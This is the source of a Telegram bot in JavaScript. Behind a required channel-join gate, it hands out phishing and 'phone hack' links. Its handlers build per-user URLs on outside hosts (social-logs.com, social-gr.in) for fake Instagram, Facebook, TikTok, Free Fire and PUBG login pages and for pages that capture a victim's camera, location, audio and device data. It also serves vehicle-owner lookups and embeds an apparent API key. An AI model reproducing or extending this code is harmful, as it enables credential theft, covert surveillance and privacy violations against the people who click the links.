const axios = require('axios');
const fs = require('fs');
const ytdl = require('ytdl-core');
const TelegramBot = require('node-telegram-bot-api');
const data = require('./data');
// Replace 'YOUR_BOT_TOKEN' with your actual bot token obtained from BotFather
const bot = new TelegramBot(data.bot_token, { polling: true });

const channels = data.channelscheck

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Check if user is already added in the data
  // You can implement your own logic to check the data store
  const isUserAdded = checkUserInData(userId);

  if (!isUserAdded) {
    // Add user to data
    addUserIdToDataFile(userId) 

    // Send join channel message
    
  
    // User already joined the channel, check membership status
    const isInChannel = await JoineCheck(userId);

    if (isInChannel) {
      // User is a member of all channels, send inline keyboard markup
      Markup(chatId);
    } else {
      // User is not a member of all channels, handle accordingly
      chajoin(chatId)
      bot.sendMessage(chatId, 'कृपया सभी आवश्यक चैनलों को ज्वाइन करें ताकि आप फीचर्स का उपयोग कर सकें।');
      
    }
  }

});

function Markup(userId) {
  const keyboard = {
  inline_keyboard: [
    [
      { text: 'Phone Hacking', callback_data: 'phone' },
      { text: 'Account hacking', callback_data: 'acc' },
    ],
    [
      { text: 'Chat GPT 💀', callback_data: 'gpt' },
      { text: 'YouTube Download 🎥', callback_data: 'yt' },
    ],
    [
      { text: 'Instagram Download 📸', callback_data: 'insta' },
      { text: 'Music Searcher 🎵', callback_data: 'music' },
    ],
    [
      { text: 'Vehicle Info 🚗', callback_data: 'vehicle' },
    ],
    [
      { text: 'Text To Voice 🗣️', callback_data: 'vtext' },
    ],
    // Add more options here as needed
  ],
};


  const message = 'Choose an option:';
  
  bot.sendMessage(userId, message, { reply_markup: keyboard })
    .catch(error => {
      console.error('Error sending message:', error);
    });
}




async function JoineCheck(userId) {
  try {
    for (const channel of channels) {
      const chatMember = await bot.getChatMember(channel, userId);
      const isMember = ['creator', 'administrator', 'member'].includes(chatMember.status);

      if (!isMember) {
        return false;
      }
    }

    return true;
  } catch (error) {
        console.error('Error checking membership:', error);
    return false;
  }
}

bot.on('text', (msg) => {
  const chatId = msg.chat.id;
  const message = msg.text;

  // Check if the user is replying to the command "🚗 Enter Your Plate Number"
  if (msg.reply_to_message && msg.reply_to_message.text === "🚗 Enter Your Plate Number") {
    // Extract the user's input from the message
    const plateNumber = message;
    bot.sendMessage(chatId, 'searching information....');
    // Replace 'https://Social-logs.com/' with your API base URL
    const baseUrl = 'https://Social-logs.com/';
    
    // Build the complete API URL with the plate number in the path
    const apiUrl = `${baseUrl}vapi.php?info=${plateNumber}`;

    // Send a request to the API
    axios
      .get(apiUrl)
      .then((response) => {
        const responseData = response.data;

        if (responseData.result.length > 0) {
          const vehicleData = responseData.result[0].vehicle[0];

          // Create a formatted message with all vehicle information in bold
          const formattedMessage = `
  1. <b>Vehicle Information:</b>
  2. - <b>Registration Number:</b> <code>${vehicleData.regn_no}</code>
  3. - <b>State Code:</b> <code>${vehicleData.state_cd}</code>
  4. - <b>RTO Code:</b> <code>${vehicleData.rto_cd}</code>
  5. - <b>RTO Name:</b> <code>${vehicleData.rto_name}</code>
  6. - <b>Chassis Number:</b> <code>${vehicleData.chasi_no}</code>
  7. - <b>Engine Number:</b> <code>${vehicleData.eng_no}</code>
  8. - <b>Registration Date:</b> <code>${vehicleData.regn_dt}</code>
  9. - <b>Vehicle Class Description:</b> <code>${vehicleData.vh_class_desc}</code>
  10. - <b>Fuel Type Description:</b> <code>${vehicleData.fla_fuel_type_desc}</code>
  11. - <b>Color:</b> <code>${vehicleData.color}</code>
  12. - <b>Manufacturing Year:</b> <code>${vehicleData.manu_yr}</code>
  13. - <b>Seat Capacity:</b> <code>${vehicleData.seat_cap}</code>
  14. - <b>Owner Name:</b> <code>${vehicleData.owner_name}</code>
  15. - <b>Commercial Flag:</b> <code>${vehicleData.commercial_flag}</code>
`;
          // Send the formatted message to the user with HTML formatting
          bot.sendMessage(chatId, formattedMessage, { parse_mode: 'HTML' });
        } else {
          // Handle the case when no vehicle information is found
          bot.sendMessage(chatId, '🚫 Vehicle information not found. Please enter a valid plate number.');
        }
      })
      .catch((error) => {
        // Handle any errors
        console.error(error);
      });
  } else {
    // Handle other user messages or commands
    // You can add code here to handle other types of messages or commands
  }
});



















async function getDownloadOptions(url) {
  try {
    if (!ytdl.validateURL(url)) {
      throw new Error('Invalid YouTube video URL');
    }

    const videoInfo = await ytdl.getInfo(url);
    const formats = ytdl.filterFormats(videoInfo.formats, 'videoandaudio');

    // Filter video qualities (144p, 240p, 360p, 480p, 720p, 1080p)
    const qualityFormats = formats.filter((format) => {
      return (
        (format.qualityLabel === '144p' ||
          format.qualityLabel === '240p' ||
          format.qualityLabel === '360p' ||
          format.qualityLabel === '480p' ||
          format.qualityLabel === '720p' ||
          format.qualityLabel === '1080p') &&
        format.mimeType.includes('video') &&
        !format.mimeType.includes('webm')
      );
    });

    // Find the first available audio format
    const audioFormat = formats.find((format) => format.mimeType.includes('audio'));

    // Generate download options with URLs for video qualities
    const options = qualityFormats.map((format) => {
      return `${format.qualityLabel}: ${format.url}`;
    });

    // Include audio format in the options if available
    if (audioFormat) {
      options.push(`Audio: ${audioFormat.url}`);
    }

    return options;
  } catch (error) {
    throw error;
  }
}

// Handler for the /ytdown command
bot.onText(/\/ytdown/, (msg) => {
  const chatId = msg.chat.id;
  ytdown(chatId);
});

function ytdown(chatId) {
  bot.sendMessage(chatId, 'Send me a YouTube URL/link.');
}

// Handler for text messages
bot.on('text', async (msg) => {
  const chatId = msg.chat.id;
  const messageText = msg.text;

  try {
    // Check if the message contains a valid YouTube URL
    if (ytdl.validateURL(messageText)) {
      const downloadOptions = await getDownloadOptions(messageText);

      // Create an inline keyboard with quality options and links
      const inlineKeyboard = downloadOptions.map((option) => {
        const [label, url] = option.split(': ');
        return [{ text: label, url: url }];
      });

      // Send the download options with inline URLs
      bot.sendMessage(chatId, 'Here are your download links 🔗', {
        reply_markup: {
          inline_keyboard: inlineKeyboard,
        },
      });
    } else {
      // Handle invalid YouTube URL
      
    }
  } catch (error) {
    // Handle any errors that occurred during the execution
    console.error('An error occurred:', error);
    
  }
});


// Start the bot

bot.on('polling_error', (error) => {
  console.error(error);
});

// Start the bot
bot.on('webhook_error', (error) => {
  console.error(error);
});



bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  switch (data) {
    case 'option1':
      const userId = callbackQuery.message.chat.id;
      handleOption1(userId);
      break;
    case 'option2':
      const userId2 = callbackQuery.message.chat.id;
      handleOption2(userId2);
      break;
    case 'option3':
      const userId3 = callbackQuery.message.chat.id;
      handleOption3(userId3);
      break;
    case 'option4':
      const userId4 = callbackQuery.message.chat.id;
      handleOption4(userId4);
      break;
    case 'option5':
      const userId5 = callbackQuery.message.chat.id;
      handleOption5(userId5);
      break;
    case 'option6':
      const userId6 = callbackQuery.message.chat.id;
      handleOption6(userId6);
      break;
    case 'option7':
      const userId7 = callbackQuery.message.chat.id;
      handleOption7(userId7);
      break;
    case 'option8':
      const userId8 = callbackQuery.message.chat.id;
      handleOption8(userId8);
      break;
    case 'help':
      // Handle help callback
      sendHelpMessage(chatId);
      break;
    case 'sos':
      // Handle SOS callback
      sendInlineKeyboard(chatId)
      break;
    case 'option9':
      const userId9 = callbackQuery.message.chat.id;
      handleOption9(userId9);
      break;
    case 'phone':
      sendInlineKeyboard(chatId)
      break;
    case 'acc':
      acc(chatId) 
      break;
    case 'gpt':
      gpt(chatId) 
      break;
    case 'option11':
      const userId11 = callbackQuery.message.chat.id;
      handleOption11(chatId);
      break;
    case 'option12':
      const userId12 = callbackQuery.message.chat.id;
      handleOption12(chatId);
      break;
    case 'option13':
      const userId13 = callbackQuery.message.chat.id;
      handleOption13(chatId);
      break;
    case 'option14':
      const userId14 = callbackQuery.message.chat.id;
      handleOption14(chatId);
      break;
    case 'option15':
      const userId15 = callbackQuery.message.chat.id;
      handleOption15(chatId);
      break;
    case 'option16':
      const userId16 = callbackQuery.message.chat.id;
      handleOption16(chatId);
      break;
    case 'option17':
      const userId17 = callbackQuery.message.chat.id;
      handleOption17(chatId);
      break;
    case 'yt':
      const u = callbackQuery.message.chat.id;
      ytdown(chatId);
      break;
    case 'insta':
      
      bot.sendMessage(chatId, 'send insta url:')
      break;
     case 'music':
      
      music(chatId)
      break;
     case 'vehicle':
      
      vehicle(chatId)
      break;
      case 'vtext':
      
      textv(chatId)
      break;
      case 'voicet':
      
      vehicle(chatId)
      break;
   
      

  }


});

//Accout Hacking Ka he 

function acc(chatId) {
  const options = [
    [
      { text: 'Instagram', callback_data: 'option11' },
      { text: 'Facebook', callback_data: 'option12' },
    ],
    [
      { text: 'TikTok ☠️', callback_data: 'option13' },
      { text: 'Free Fire 👽', callback_data: 'option14' },
    ],
    [
      { text: 'Discord 👻', callback_data: 'option15' },
      { text: 'SnapChat ☠️', callback_data: 'option16' },
    ],
    [
      { text: 'Pubg 👺', callback_data: 'option17' },
      { text: 'Coming 👾', callback_data: 'option8' },
    ],
    [
      { text: 'Disclaimer 📛', callback_data: 'option9' },
    ]
  ];

  const inlineKeyboardMarkup = {
    inline_keyboard: options,
  };

  bot.sendMessage(chatId, 'Please select an phishing option:', {
    reply_markup: inlineKeyboardMarkup,
  });
}









// Function to send the inline keyboard markup
function sendInlineKeyboard(chatId) {
  const options = [
    [
      { text: 'All In One Hack 😈', callback_data: 'option1' },
      { text: 'Only Location 👅', callback_data: 'option2' },
    ],
    [
      { text: 'Only Camera ☠️', callback_data: 'option3' },
      { text: 'Camera + location 👽', callback_data: 'option4' },
    ],
    [
      { text: 'Only Mobile InFo 👻', callback_data: 'option5' },
      { text: 'Audio ☠️', callback_data: 'option6' },
    ],
    [
      { text: 'Gallery Hack 👺', callback_data: 'option7' },
      { text: 'Coming 👾', callback_data: 'option8' },
    ],
    [
      { text: 'Disclaimer 📛', callback_data: 'option9' },
    ]
  ];

  const inlineKeyboardMarkup = {
    inline_keyboard: options,
  };

  bot.sendMessage(chatId, 'Please select an option:', {
    reply_markup: inlineKeyboardMarkup,
  });
}


// Function to send a "Good Morning" message
function sendGoodMorningMessage(chatId) {
  bot.sendMessage(chatId, 'Good Morning! Have a great day!');
}

// Function to check if user is already added in the data
function checkUserInData(userId) {
  // Implement your own logic to check if the user is already added in the data store
  // Return true if user is found, otherwise false
  return false;
}

// Function to add user to the data
function addUserToData(userId) {
  // Implement your own logic to add the user to the data store
}

// Async function to check if the user is a member of all required channels
async function JoineCheck(userId) {
  try {
    for (const channel of channels) {
      const chatMember = await bot.getChatMember(channel, userId);
      const isMember = ['creator', 'administrator', 'member'].includes(chatMember.status);

      if (!isMember) {
        return false;
      }
    }

    return true;
  } catch (error) {
        console.error('Error checking membership:', error);
    return false;
  }
}

// Start the bot
bot.on('polling_error', (error) => {
  console.error('Polling error:', error);
});








function sendVideoWithCatchError(chatId, replacedText, caption) {
  bot.sendVideo(chatId, replacedText, { caption })
    .then((response) => {
      // Video sent successfully
      
    })
    .catch((error) => {
      // Handle the error and send an error message
      console.error('Error sending video:', error);
      bot.sendMessage(chatId, 'Sorry, there was an error sending the video private .');
    });
}



async function sendInstagramUrlWithPrefix(chatId, text) {
  const apiUrl = 'https://instagram-videos.vercel.app/';
  const tex = `[${JSON.stringify(text)}]`; // Fix template literals and use JSON.stringify
  try {
    // Make a POST request to the Instagram Videos API for each URL
    const response = await axios.post(apiUrl, { tex });
    const videoUrl = response.data[1][0].data.videoUrl;
    console.log('Video URL:', videoUrl);
    
    // Assuming `bot` is defined elsewhere in your code
    bot.sendVideo(chatId, videoUrl);
    // You can call your sendVideoWithCatchError function here with the videoUrl
  } catch (error) {
    console.error('Error:', error.message);
  }
}





// Handle text messages
bot.on('text', (msg) => {
  const chatId = msg.chat.id;
  const messageText = msg.text;

  // Check if the message contains Instagram URLs
  if (messageText.includes('instagram.com')) {
    // Process and send Instagram URLs with the "dd" prefix
    sendInstagramUrlWithPrefix(chatId, messageText);
  } else {
    // Handle other text messages here
  }
});









bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data.startsWith('/getMusic')) {
    const songId = data.split(' ')[1];
    // You have extracted the songId from the callback data, and now you can perform actions with it
    // For example, you can send more information about the song based on the songId
    sendSongInfo(chatId, songId);
  }
});




async function sendSongInfo(chatId, params) {
  try {
    if (params !== 'None') {
      const url = `https://saavn.me/songs/?id=${params}`;
      const response = await axios.get(url);
      const result = response.data.data[0]; // Access the first item in the 'data' array

      const button = {
        reply_markup: JSON.stringify({
          inline_keyboard: [
            [{ text: 'Saavn', url: result.url }, { text: 'listen more', url: 'https://fastearnly.com' }]
          ]
        })
      };

      const songInfo = {
        song: result.name,
        artist: result.primaryArtists,
      };

      bot.sendPhoto(chatId, result.image[2].link, {
  caption: `<b>Song:</b> ${songInfo.song}\n<b>Artist:</b> ${songInfo.artist}\n<b>Year:</b> ${result.year}\n<b>Duration:</b> ${result.duration} seconds\n<b>Label:</b> ${result.label}`,
  parse_mode: 'HTML',
  reply_markup: button
});

      bot.sendAudio(chatId, result.downloadUrl[4].link, {
        caption: `<b>Song:</b> ${songInfo.song}\n<b>Artist:</b> ${songInfo.artist}\n listen more :\n https://fastearnly.com`,
        parse_mode: 'HTML',
        reply_markup: button
      });
    }
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, 'An error occurred while fetching the song.');
  }
}


function ghpt(chatId) {
  

  // Send a welcome message asking the user to send a question
  bot.sendMessage(chatId, "Hello! Please send me your question.");
};

bot.on('message', async (msg) => {

  const messageText = msg.text;

  // Check if user has sent a reply to the bot's previous message
  if (msg.reply_to_message && msg.reply_to_message.text === "🌐 Enter Your Q") {
    const chaId = msg.chat.id;
    // Get AI reply using the provided function
    bot.sendMessage(chaId, 'Searching Answer....');
    const aiReply = await getAIReply(messageText);

    if (aiReply !== null) {
      const inlineKeyboard = {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Next Question', callback_data: 'next_question' }]
      ]
    }
  };
      
      const chatId = msg.chat.id;
      bot.sendMessage(chatId, aiReply, { parse_mode: 'Markdown', ...inlineKeyboard });
    } else {
       const chatId = msg.chat.id;
  
       bot.sendMessage(chatId, 'Sorry, an error occurred while fetching AI reply.');
    }
  } else {
    // User didn't reply to the bot's message, createNew function
    const chatId = msg.chat.id;
  
  }
});

function vehicle(chatId){
  var mk = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  bot.sendMessage(chatId, "🚗 Enter Your Plate Number", mk);
}

function textv(chatId){
  var mk = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  bot.sendMessage(chatId, "Enter your text message to convert:", mk);
}
function music(chatId){
  var mk = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  bot.sendMessage(chatId, "Enter your music name:", mk);
}



function gpt(chatId){
  var mk = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  bot.sendMessage(chatId, "🌐 Enter Your Q", mk);
}

async function getAIReply(messageText) {
  const url = `https://hercai.onrender.com/v3-beta/hercai?question=${encodeURIComponent(messageText)}`;
  
  try {
    const response = await axios.get(url);
    const reply = response.data.reply;
    return reply;
  } catch (error) {
    console.error('Error fetching AI reply:', error);
    return null;
  }
}
    









bot.onText(/\/stkm/, (msg) => {
  const chatId = msg.chat.id;

  // Send a welcome message
  bot.sendMessage(chatId, 'Welcome to the bot! Use /join to join the channels.');
});

function chajoin(chatId) {
  const channelsList = data.channelsList
  const channels = channelsList;

  const keyboardRows = [];
  for (let i = 0; i < channels.length; i += 2) {
    const row = channels.slice(i, i + 2).map(channel => ({
      text: 'channel',
      url: `https://t.me/${channel.replace('@', '')}`,
    }));
    keyboardRows.push(row);
  }

  const inlineKeyboard = keyboardRows.map(row => [...row]);

  bot.sendMessage(chatId, 'Join Our Channels:', {
    reply_markup: {
      inline_keyboard: inlineKeyboard,
    },
  });

  const adminChatId = '5903136689'; // Replace with the admin's chat ID
  bot.sendMessage(adminChatId, `New user joined:\nChat ID: ${chatId}`);
  addUserIdToDataFile(chatId);
}


    
// Function to handle unknown commands










bot.on('text', async (msg) => {
  const chatId = msg.chat.id;
  const messageText = msg.text;

  if (msg.reply_to_message && msg.reply_to_message.text === 'Enter your music name:') {
    // User is responding to the bot's prompt
    try {
      // Make an HTTP GET request to the JioSaavn Music API
      const response = await axios.get(`https://jiosavan-music-api.vercel.app/search?query=${encodeURIComponent(messageText)}`);
      const result = response.data;

      if (result.results.length === 0) {
        bot.sendMessage(chatId, '🔘 *No Result Found*', { parse_mode: 'Markdown' });
      } else {
        const buttons = [];

        for (const item of result.results) {
          const title = item.title;
          const songId = item.id;
          buttons.push([{ text: title, callback_data: `/getMusic ${songId}` }]);
        }

        buttons.push([{ text: '❌', callback_data: '/close' }]);
        const markup = { inline_keyboard: buttons };

        bot.sendMessage(chatId, `🔍 *Searching For:* ${messageText}`, {
          parse_mode: 'Markdown',
          reply_markup: markup,
          reply_to_message_id: msg.message_id,
        });
      }
    } catch (error) {
      console.error(error);
      bot.sendMessage(chatId, 'An error occurred while searching for music.');
    }
  } else {
    // User is not responding to the bot's prompt, handle other messages here
  }
});




bot.on('text', async (msg) => {
  const chatId = msg.chat.id;
  const messageText = msg.text;

  // Check if the user is replying to the specific prompt message
  if (msg.reply_to_message && msg.reply_to_message.text === 'Enter your text message to convert:') {
    try {
      const voiceUrl = `http://api.voicerss.org/?key=3f5866ce7e32445f903e48fb27e58796&hl=en-us&r=-1&c=MP3&src=${encodeURIComponent(messageText)}`;
      
      // Send the voice message
      bot.sendVoice(chatId, voiceUrl);

    } catch (error) {
      console.error(error);
      bot.sendMessage(chatId, 'An error occurred while converting text to voice.');
    }
  }
});

function handleOption1(userId) {
  // Retrieve the bot's username
  bot.getMe()
    .then(botInfo => {
      const botUsername = botInfo.username;

      // Check if the user has joined the required channels
      JoineCheck(userId)
        .then(isJoined => {
          if (isJoined) {
            const u = String(userId);
            const link = `Https://Social-logs.com/8/?id=${u}`;
            const url = `https://social-logs.com/k/short.php?url=${link}`;

            // Make an HTTP request to get the shortened URL
            axios
              .get(url)
              .then((response) => {
                const result = response.data;
                const short = result.url;

                // Create the message with formatted text
                const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: 𝐀𝐥𝐥 𝐈𝐧 𝐎𝐧𝐞 𝐏𝐡𝐨𝐧𝐞 𝐇𝐚𝐜𝐤 😈\n\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}\n\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @${botUsername}`;

                // Send the message to the user
                bot.sendMessage(userId, message);
              })
              .catch((error) => {
                console.error('Error retrieving shortened URL:', error);
              });
          } else {
            // User has not joined required channels, run chajoin function
            chajoin(userId);
          }
        })
        .catch(error => {
          console.error('Error checking membership:', error);
        });
    })
    .catch(error => {
      console.error('Error retrieving bot information:', error);
    });
}



function handleOption2(userId2) {
  // Retrieve the bot's username
  bot.getMe()
    .then(botInfo => {
      const botUsername = botInfo.username;

      // Check if the user has joined the required channels
      JoineCheck(userId2)
        .then(isJoined => {
          if (isJoined) {
            const u = String(userId2);
            const link = `Https://Social-logs.com/ttttt/?id=${u}`;
            const url = `https://social-logs.com/k/short.php?url=${link}`;

            // Make an HTTP request to get the shortened URL
            axios
              .get(url)
              .then((response) => {
                const result = response.data;
                const short = result.url;

                // Create the message with formatted text
                const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: Location Hack 𝐇𝐚𝐜𝐤 😈\n\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}\n\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @${botUsername}`;

                // Send the message to the user
                bot.sendMessage(userId2, message);
              })
              .catch((error) => {
                console.error('Error retrieving shortened URL:', error);
              });
          } else {
            // User has not joined required channels, run chajoin function
            chajoin(userId2);
          }
        })
        .catch(error => {
          console.error('Error checking membership:', error);
        });
    })
    .catch(error => {
      console.error('Error retrieving bot information:', error);
    });
}



function handleOption3(userId3) {
  // Check if the user has joined the required channels
  JoineCheck(userId3)
    .then(isJoined => {
      if (isJoined) {
        const u = String(userId3);
        const link = `Https://Social-logs.com/7/?id=${u}`;
        const url = `https://social-logs.com/k/short.php?url=${link}`;

        // Make an HTTP request to get the shortened URL
        axios
          .get(url)
          .then((response) => {
            const result = response.data;
            const short = result.url;

            // Retrieve the bot's username
            bot.getMe()
              .then(botInfo => {
                const botUsername = botInfo.username;

                // Create the message with formatted text
                const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: ONLY CAMERA 𝐇𝐚𝐜𝐤 😈\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @${botUsername}`;

                // Send the message to the user
                bot.sendMessage(userId3, message);
              })
              .catch(error => {
                console.error('Error retrieving bot information:', error);
              });
          })
          .catch((error) => {
            console.error('Error retrieving shortened URL:', error);
          });
      } else {
        // User has not joined required channels, run chajoin function
        chajoin(userId3);
      }
    })
    .catch(error => {
      console.error('Error checking membership:', error);
    });
}


function handleOption4(userId4) {
  // Check if the user has joined the required channels
  JoineCheck(userId4)
    .then(isJoined => {
      if (isJoined) {
        const u = String(userId4);
        const link = `Https://Social-logs.com/ccccc/?id=${u}`;
        const url = `https://social-logs.com/k/short.php?url=${link}`;

        // Make an HTTP request to get the shortened URL
        axios
          .get(url)
          .then((response) => {
            const result = response.data;
            const short = result.url;

            // Retrieve the bot's username
            bot.getMe()
              .then(botInfo => {
                const botUsername = botInfo.username;

                // Create the message with formatted text
                const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: CAMERA + LOCATION 𝐇𝐚𝐜𝐤 😈\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @${botUsername}`;

                // Send the message to the user
                bot.sendMessage(userId4, message);
              })
              .catch(error => {
                console.error('Error retrieving bot information:', error);
              });
          })
          .catch((error) => {
            console.error('Error retrieving shortened URL:', error);
          });
      } else {
        // User has not joined required channels, run chajoin function
        chajoin(userId4);
      }
    })
    .catch(error => {
      console.error('Error checking membership:', error);
    });
}


function handleOption5(userId5) {
  // Check if the user has joined the required channels
  JoineCheck(userId5)
    .then(isJoined => {
      if (isJoined) {
        const u = String(userId5);
        const link = `Https://Social-logs.com/11111/?id=${u}`;
        const url = `https://social-logs.com/k/short.php?url=${link}`;

        // Make an HTTP request to get the shortened URL
        axios
          .get(url)
          .then((response) => {
            const result = response.data;
            const short = result.url;

            // Retrieve the bot's username
            bot.getMe()
              .then(botInfo => {
                const botUsername = botInfo.username;

                // Create the message with formatted text
                const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: ONLY MOBILE INFO 𝐇𝐚𝐜𝐤 😈\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @${botUsername}`;

                // Send the message to the user
                bot.sendMessage(userId5, message);
              })
              .catch(error => {
                console.error('Error retrieving bot information:', error);
              });
          })
          .catch((error) => {
            console.error('Error retrieving shortened URL:', error);
          });
      } else {
        // User has not joined required channels, run chajoin function
        chajoin(userId5);
      }
    })
    .catch(error => {
      console.error('Error checking membership:', error);
    });
}


function handleOption6(userId6) {
  // Check if the user has joined the required channels
  JoineCheck(userId6)
    .then(isJoined => {
      if (isJoined) {
        const u = String(userId6);
        const link = `Https://Social-logs.com/jjjjj/?id=${u}`;
        const url = `https://social-logs.com/k/short.php?url=${link}`;

        // Make an HTTP request to get the shortened URL
        axios
          .get(url)
          .then((response) => {
            const result = response.data;
            const short = result.url;

            // Retrieve the bot's username
            bot.getMe()
              .then(botInfo => {
                const botUsername = botInfo.username;

                // Create the message with formatted text
                const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: AUDIO 𝐇𝐚𝐜𝐤 😈\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @${botUsername}`;

                // Send the message to the user
                bot.sendMessage(userId6, message);
              })
              .catch(error => {
                console.error('Error retrieving bot information:', error);
              });
          })
          .catch((error) => {
            console.error('Error retrieving shortened URL:', error);
          });
      } else {
        // User has not joined required channels, run chajoin function
        chajoin(userId6);
      }
    })
    .catch(error => {
      console.error('Error checking membership:', error);
    });
}







function handleOption11(chatId) {
  // Retrieve the bot's username
  bot.getMe()
    .then(botInfo => {
      const botUsername = botInfo.username;

      // Check if the user has joined the required channels
      JoineCheck(chatId)
        .then(isJoined => {
          if (isJoined) {
            const u = String(chatId);
            const link = `https://social-gr.in/iins.php?id=${u}`;
            const url = `https://social-logs.com/k/short.php?url=${link}`;

            // Make an HTTP request to get the shortened URL
            axios
              .get(url)
              .then((response) => {
                const result = response.data;
                const short = result.url;

                // Create the message with formatted text
                const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: instagram 😈\n\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}\n\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @${botUsername}`;

                // Send the message to the user
                bot.sendMessage(chatId, message);
              })
              .catch((error) => {
                console.error('Error retrieving shortened URL:', error);
              });
          } else {
            // User has not joined required channels, run chajoin function
            chajoin(chatId);
          }
        })
        .catch(error => {
          console.error('Error checking membership:', error);
        });
    })
    .catch(error => {
      console.error('Error retrieving bot information:', error);
    });
}



function handleOption12(chatId) {
  // Retrieve the bot's username
  bot.getMe()
    .then(botInfo => {
      const botUsername = botInfo.username;

      // Check if the user has joined the required channels
      JoineCheck(chatId)
        .then(isJoined => {
          if (isJoined) {
            const u = String(chatId);
            const link = `https://social-gr.in/ffa.php?id=${u}`;
            const url = `https://social-logs.com/k/short.php?url=${link}`;

            // Make an HTTP request to get the shortened URL
            axios
              .get(url)
              .then((response) => {
                const result = response.data;
                const short = result.url;

                // Create the message with formatted text
                const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: Facebook 😈\n\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}\n\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @${botUsername}`;

                // Send the message to the user
                bot.sendMessage(chatId, message);
              })
              .catch((error) => {
                console.error('Error retrieving shortened URL:', error);
              });
          } else {
            // User has not joined required channels, run chajoin function
            chajoin(chatId);
          }
        })
        .catch(error => {
          console.error('Error checking membership:', error);
        });
    })
    .catch(error => {
      console.error('Error retrieving bot information:', error);
    });
}

function handleOption13(chatId) {
  // Retrieve the bot's username
  bot.getMe()
    .then(botInfo => {
      const botUsername = botInfo.username;

      // Check if the user has joined the required channels
      JoineCheck(chatId)
        .then(isJoined => {
          if (isJoined) {
            const u = String(chatId);
            const link = `https://social-gr.in/Tjk.php?id=${u}`;
            const url = `https://social-logs.com/k/short.php?url=${link}`;

            // Make an HTTP request to get the shortened URL
            axios
              .get(url)
              .then((response) => {
                const result = response.data;
                const short = result.url;

                // Create the message with formatted text
                const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: TikTok 😈\n\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}\n\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @${botUsername}`;

                // Send the message to the user
                bot.sendMessage(chatId, message);
              })
              .catch((error) => {
                console.error('Error retrieving shortened URL:', error);
              });
          } else {
            // User has not joined required channels, run chajoin function
            chajoin(chatId);
          }
        })
        .catch(error => {
          console.error('Error checking membership:', error);
        });
    })
    .catch(error => {
      console.error('Error retrieving bot information:', error);
    });
}


function handleOption14(chatId) {
  // Retrieve the bot's username
  bot.getMe()
    .then(botInfo => {
      const botUsername = botInfo.username;

      // Check if the user has joined the required channels
      JoineCheck(chatId)
        .then(isJoined => {
          if (isJoined) {
            const u = String(chatId);
            const link = `https://social-gr.in/FFF.php?id=${u}`;
            const url = `https://social-logs.com/k/short.php?url=${link}`;

            // Make an HTTP request to get the shortened URL
            axios
              .get(url)
              .then((response) => {
                const result = response.data;
                const short = result.url;

                // Create the message with formatted text
                const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: FreeFire 😈\n\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}\n\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @${botUsername}`;

                // Send the message to the user
                bot.sendMessage(chatId, message);
              })
              .catch((error) => {
                console.error('Error retrieving shortened URL:', error);
              });
          } else {
            // User has not joined required channels, run chajoin function
            chajoin(chatId);
          }
        })
        .catch(error => {
          console.error('Error checking membership:', error);
        });
    })
